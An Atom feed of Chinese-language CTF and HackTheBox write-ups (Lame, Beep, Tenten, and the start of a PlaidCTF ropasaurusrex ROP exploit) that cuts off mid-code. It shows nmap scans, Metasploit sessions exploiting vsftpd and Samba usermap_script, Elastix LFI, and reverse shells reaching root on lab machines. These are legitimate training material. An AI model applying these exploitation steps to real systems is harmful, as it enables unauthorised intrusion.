<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>danta</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://danta.fun/"/>
  <updated>2019-12-20T08:06:24.277Z</updated>
  <id>https://danta.fun/</id>
  
  <author>
    <name>danta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTB Tenten Writeup</title>
    <link href="https://danta.fun/2019/12/19/HTB-Tenten-Writeup/"/>
    <id>https://danta.fun/2019/12/19/HTB-Tenten-Writeup/</id>
    <published>2019-12-19T14:14:20.000Z</published>
    <updated>2019-12-20T08:06:24.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>HackTheBox 同名靶机：<a href="https://www.hackthebox.eu/home/machines/profile/8" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/8</a></p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>nmap 扫了一波 只有80和22</p><h1 id="0x02-Web"><a href="#0x02-Web" class="headerlink" title="0x02 Web"></a>0x02 Web</h1><p>80打开是一个WordPress，而且是刚布上，什么都没有。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;HackTheBox 同名靶机：&lt;a href=&quot;https://www.hackthebox.eu
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTB Lame Writeup</title>
    <link href="https://danta.fun/2019/12/18/HTB-Lame-Writeup/"/>
    <id>https://danta.fun/2019/12/18/HTB-Lame-Writeup/</id>
    <published>2019-12-18T14:39:44.000Z</published>
    <updated>2019-12-18T15:53:36.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>HackTheBox 同名靶机</p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ports=$(nmap -PN -p- --min-rate=1000 -T4 10.10.10.3 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ','| sed s/,$//)</span></span><br><span class="line"><span class="comment"># nmap -Pn -p$ports -sC -sV 10.10.10.3</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-18 09:24 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.3</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:<span class="built_in">cd</span> (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb-security-mode: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 96.92 seconds</span><br></pre></td></tr></table></figure><p>匿名登录smb失败，匿名登录ftp成功，但啥也没有。</p><h1 id="0x02-GetShell"><a href="#0x02-GetShell" class="headerlink" title="0x02 GetShell"></a>0x02 GetShell</h1><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit vsftpd 2.3.4                                                                                                                                                                      [22:41:28]</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                 |  Path</span><br><span class="line">                                                                                                                                               | (/usr/<span class="built_in">local</span>/opt/exploitdb/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                         | exploits/unix/remote/17491.rb</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>转而使用msf，但利用EXP失败：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                  Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="built_in">set</span> rhosts 10.10.10.3</span><br><span class="line">rhosts =&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 10.10.10.3:21 - USER: 331 Please specify the password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search samba</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                 Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                 ---------------  ----       -----  -----------</span><br><span class="line">   0   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal</span><br><span class="line">   1   auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow</span><br><span class="line">   2   auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   3   auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow</span><br><span class="line">   4   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules</span><br><span class="line">   5   auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State</span><br><span class="line">   6   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   7   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)</span><br><span class="line">   8   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load</span><br><span class="line">   9   exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow</span><br><span class="line">   11  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)</span><br><span class="line">   12  exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   13  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba <span class="string">"username map script"</span> Command Execution</span><br><span class="line">   14  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   15  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   16  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   17  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line">   18  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection</span><br><span class="line">   19  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution</span><br><span class="line">   20  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution</span><br><span class="line">   21  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution</span><br><span class="line">   22  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow</span><br><span class="line">   23  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow</span><br><span class="line">   24  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource</span><br><span class="line">   25  post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/samba/usermap_script</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; <span class="built_in">set</span> rhosts 10.10.10.3</span><br><span class="line">rhosts =&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.14.9:4444</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> g683nZMOwtlWKtwA;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: <span class="string">"sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\ng683nZMOwtlWKtwA\r\n"</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.9:4444 -&gt; 10.10.10.3:50738) at 2019-12-18 23:49:50 +0800</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;HackTheBox 同名靶机&lt;/p&gt;
&lt;h1 id=&quot;0x01-信息收集&quot;&gt;&lt;a href=&quot;#0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTB Beep Writeup</title>
    <link href="https://danta.fun/2019/12/16/HTB-Beep-Writeup/"/>
    <id>https://danta.fun/2019/12/16/HTB-Beep-Writeup/</id>
    <published>2019-12-16T14:26:00.000Z</published>
    <updated>2019-12-17T16:27:19.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一篇writeup，靶机是来自hackthebox的<a href="https://www.hackthebox.eu/home/machines/profile/5" target="_blank" rel="noopener">Beep</a></p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/htb/beep<span class="comment"># ports=$(nmap -PN -p- --min-rate=1000 -T4 10.10.10.7 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ','| sed s/,$//)</span></span><br><span class="line">root@kali:~/htb/beep<span class="comment"># nmap -p$ports -sC -sV 10.10.10.7</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-16 09:24 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.7</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)</span><br><span class="line">|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)</span><br><span class="line">25/tcp   open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,</span><br><span class="line">80/tcp   open  http       Apache httpd 2.2.3</span><br><span class="line">|_http-server-header: Apache/2.2.3 (CentOS)</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.7/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">110/tcp  open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_pop3-capabilities: RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) USER TOP AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) STLS PIPELINING UIDL APOP</span><br><span class="line">111/tcp  open  rpcbind    2 (RPC <span class="comment">#100000)</span></span><br><span class="line">143/tcp  open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_imap-capabilities: MULTIAPPEND CHILDREN Completed CONDSTORE IDLE SORT=MODSEQ ATOMIC QUOTA IMAP4 MAILBOX-REFERRALS THREAD=REFERENCES SORT X-NETSCAPE UNSELECT LIST-SUBSCRIBED LISTEXT OK CATENATE NO ANNOTATEMORE URLAUTHA0001 THREAD=ORDEREDSUBJECT RIGHTS=kxte IMAP4rev1 BINARY ID ACL LITERAL+ RENAME UIDPLUS STARTTLS NAMESPACE</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">|_ssl-date: 2019-12-16T15:29:00+00:00; +1h00m45s from scanner time.</span><br><span class="line">993/tcp  open  ssl/imap   Cyrus imapd</span><br><span class="line">|_imap-capabilities: CAPABILITY</span><br><span class="line">995/tcp  open  pop3       Cyrus pop3d</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">|_mysql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5038/tcp open  asterisk   Asterisk Call Manager 1.1</span><br><span class="line">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1h00m44s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 394.04 seconds</span><br></pre></td></tr></table></figure><p>因为直接全扫太慢了，所以分开两次扫，第一次粗扫，对第一次的结果再细扫。不过没想到居然开了这么多端口。。</p><p>80打开是一个<code>Elastix</code>，网上搜了一下默认密码，还包括MySql数据库的默认密码，尝试登录80或3306都不成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/htb/beep<span class="comment"># mysql -h 10.10.10.7 -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">ERROR 1130 (HY000): Host <span class="string">'10.10.14.9'</span> is not allowed to connect to this MySQL server</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>查了下<code>Elastix</code>好像是个电话服务器，是<code>asterisk</code>的后台管理页面。</p><p>查一下cve</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[0] % searchsploit elastix</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                 |  Path</span><br><span class="line">                                                                                                                                               | (/usr/<span class="built_in">local</span>/opt/exploitdb/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Elastix - <span class="string">'page'</span> Cross-Site Scripting                                                                                                          | exploits/php/webapps/38078.py</span><br><span class="line">Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                        | exploits/php/webapps/38544.txt</span><br><span class="line">Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                  | exploits/php/webapps/34942.txt</span><br><span class="line">Elastix 2.2.0 - <span class="string">'graph.php'</span> Local File Inclusion                                                                                               | exploits/php/webapps/37637.pl</span><br><span class="line">Elastix 2.x - Blind SQL Injection                                                                                                              | exploits/php/webapps/36305.txt</span><br><span class="line">Elastix &lt; 2.5 - PHP Code Injection                                                                                                             | exploits/php/webapps/38091.php</span><br><span class="line">FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                         | exploits/php/webapps/18650.py</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>稍微试了几个，LFI的漏洞是可利用的：</p><p><img src="/image/9.jpg" alt></p><p>有了密码之后就可以登录了。</p><p>也尝试了代码执行的CVE，但是需要一个电话号码。翻看了下后台找到一个号码：</p><p><img src="/image/10.jpg" alt></p><p>那么那就弹个shell吧，使用<a href="http://www.exploit-db.com/exploits/18649" target="_blank" rel="noopener">http://www.exploit-db.com/exploits/18649</a>来getshell，但是代码中的payload并不奏效，那就从owefsad大佬的文章<a href="https://exexute.github.io/2019/04/24/how-get-a-reverse-shell/" target="_blank" rel="noopener">how get a reverse shell</a>随手挑一个payload试一下。</p><p>没想到这就登录进来了，还是ROOT权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0] % nc -lv 443</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-3.2<span class="comment"># ls</span></span><br><span class="line">user.txt</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>最后看了下别人的writeup，原来那个密码就是ssh的root账号密码。密码复用的问题还是值得重视。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这是一篇writeup，靶机是来自hackthebox的&lt;a href=&quot;https://www.h
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PlaidCTF 2013 ropasaurusrex writeup - PWN</title>
    <link href="https://danta.fun/2019/12/15/PlaidCTF-2013-ropasaurusrex-writeup/"/>
    <id>https://danta.fun/2019/12/15/PlaidCTF-2013-ropasaurusrex-writeup/</id>
    <published>2019-12-15T07:31:03.000Z</published>
    <updated>2019-12-16T14:54:38.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文有关的程序可以到我的github中下载：<a href="https://github.com/cxliker/ctf_pwn/tree/master/ropasaurusrex" target="_blank" rel="noopener">https://github.com/cxliker/ctf_pwn/tree/master/ropasaurusrex</a><br>这题给了libc.so文件，变得简单了一些，省去了我们猜版本的麻烦（但是我找不到线上的环境，所以还是用不到这个给的libc.so，用本地的libc.so测试）。此题的特点在于需要我们info leak得到信息，然后计算出system的地址。</p><p>文章中参考到的博客 <a href="http://bestwing.me/2017/03/19/stack-overflow-two-ROP/" target="_blank" rel="noopener">http://bestwing.me/2017/03/19/stack-overflow-two-ROP/</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><h2 id="例行公事老3步之第一步：checksec"><a href="#例行公事老3步之第一步：checksec" class="headerlink" title="例行公事老3步之第一步：checksec"></a>例行公事老3步之第一步：checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec ropasaurusrex </span><br><span class="line">[*] <span class="string">'/root/code/ctf/pwn/ropasaurusrex/ropasaurusrex'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="例行公事老3步之第二步：运行看懂程序流程"><a href="#例行公事老3步之第二步：运行看懂程序流程" class="headerlink" title="例行公事老3步之第二步：运行看懂程序流程"></a>例行公事老3步之第二步：运行看懂程序流程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./ropasaurusrex </span><br><span class="line">hhhhhhhhstep2</span><br><span class="line">WIN</span><br></pre></td></tr></table></figure><p>程序流程简单到不能在简单了，输入一个字符串，输出一个字符串<code>win</code></p><h2 id="例行公事老3步之第三部：ida"><a href="#例行公事老3步之第三部：ida" class="headerlink" title="例行公事老3步之第三部：ida"></a>例行公事老3步之第三部：ida</h2><p>因为程序也比较简单，直接看汇编代码也没问题。</p><p><img src="/image/6.png" alt></p><p>可以从图中看到buf定义了0x88大小，但是却被允许输入0x100大小的字符串，由此引起了缓冲区溢出的漏洞。</p><p>这题正好很像之前蒸米师傅说的一道例题，引用其在文章 <em>一步一步学ROP之linux_x86篇</em> 中的一段话</p><blockquote><p>我们发现除了程序本身的实现的函数之外，我们还可以使用<code>read@plt()</code>和<code>write@plt()</code>函数。但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取shell。但其实我们有<code>write@plt()</code>函数就够了，因为我们可以通过<code>write@plt()</code>函数把<code>write()</code>函数在内存中的地址也就是<code>write.got</code>给打印出来。既然<code>write()</code>函数实现是在libc.so当中，那我们调用的<code>write@plt()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write@plit()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write@plit()</code>会根据<code>write.got</code> 跳转到真正的<code>write()</code>函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p></blockquote><p>所以题目的思路就有了：</p><ol><li>利用<code>write@plt</code>构造payload leak 内中的一个函数地址</li><li>通过上一步得到的地址，和libc自己计算好的offset，可以算出libc base</li><li>根据libc base和offset，算出<code>system</code>和<code>/bin/sh</code>的地址</li><li>构造payload get shell</li></ol><h1 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 